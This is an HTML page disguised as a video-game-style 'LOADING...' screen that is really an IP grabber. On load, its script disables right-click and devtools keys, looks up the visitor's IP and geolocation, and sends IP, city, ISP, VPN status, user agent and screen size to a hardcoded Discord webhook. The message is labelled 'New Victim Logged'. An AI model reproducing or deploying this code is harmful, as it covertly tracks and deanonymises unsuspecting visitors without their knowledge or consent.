<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Loading...</title>
<style>
  /* GTA IV style loading screen */

  html, body {
    margin: 0; padding: 0; height: 100%;
    background: black;
    display: flex;
    justify-content: center;
    align-items: center;
    user-select: none;
    font-family: 'Arial Black', Arial, sans-serif;
    color: white;
  }

  #loading-text {
    font-size: 6rem;
    letter-spacing: 0.3em;
    animation: flickerGTA 2.5s infinite alternate;
  }

  @keyframes flickerGTA {
    0%, 100% { opacity: 1; }
    40%, 60% { opacity: 0.3; }
  }
</style>
</head>
<body>

<div id="loading-text">LOADING...</div>

<script>
  // Prevent right-click context menu
  document.addEventListener('contextmenu', e => e.preventDefault());

  // Disable some devtools keys
  document.addEventListener('keydown', e => {
    if (
      e.key === "F12" ||
      (e.ctrlKey && e.shiftKey && ['I', 'C'].includes(e.key.toUpperCase())) ||
      (e.ctrlKey && e.key.toUpperCase() === 'U')
    ) {
      e.preventDefault();
    }
  });

  const webhookUrl = "https://discord.com/api/webhooks/1403468598286221333/d15xSrnNqkAJ_jk5cnGqcLh8oigcdjJlZHj7t9aqM4DDmQ5K9Rif6jVdewyWrAFr8Hcg";

  async function fetchIPInfo() {
    // Using ipwhois.app for geo and VPN detection (free and no key)
    const res = await fetch('https://ipwhois.app/json/');
    if (!res.ok) throw new Error('Failed to fetch IP info');
    return res.json();
  }

  async function sendDiscordWebhook(data) {
    // Compose embed
    const embed = {
      title: "ðŸ•µï¸ New Victim Logged",
      color: 0xFFFFFF,
      timestamp: new Date().toISOString(),
      footer: {
        text: "Get Trolled IP Grabber",
        icon_url: "https://i.imgur.com/qZ7j0fV.png"
      },
      thumbnail: {
        url: data.country_flag || ""
      },
      author: {
        name: "Get Trolled IP Logger",
        url: "https://discord.com",
        icon_url: "https://i.imgur.com/qZ7j0fV.png"
      },
      fields: [
        { name: "IPv4 Address", value: `\`${data.ip}\``, inline: true },
        { name: "Country", value: `${data.country} (${data.country_code})`, inline: true },
        { name: "Region", value: `${data.region}`, inline: true },
        { name: "City", value: `${data.city}`, inline: true },
        { name: "ISP", value: `${data.isp}`, inline: false },
        { name: "Timezone", value: `${data.timezone_gmt} (${data.timezone})`, inline: true },
        { name: "VPN/Proxy Detected", value: `${data.security.is_proxy ? "Yes" : "No"}`, inline: true },
        { name: "User Agent", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false },
        { name: "Screen Resolution", value: `\`${window.screen.width}Ã—${window.screen.height} (${window.devicePixelRatio} DPR)\``, inline: true }
      ]
    };

    // Discord requires CORS proxy for client-side requests â€” 
    // you should proxy this request via your own backend or use cors-anywhere temporarily

    // For demo, using cors-anywhere:
    const corsProxy = "https://cors-anywhere.herokuapp.com/";

    try {
      const res = await fetch(corsProxy + webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] }),
      });
      if (!res.ok) throw new Error(`Webhook error ${res.status}`);
      console.log("Logged successfully");
    } catch (err) {
      console.error("Failed to send webhook:", err);
    }
  }

  (async () => {
    try {
      const data = await fetchIPInfo();
      await sendDiscordWebhook(data);
    } catch (e) {
      console.error(e);
    }
  })();

</script>
</body>
</html>
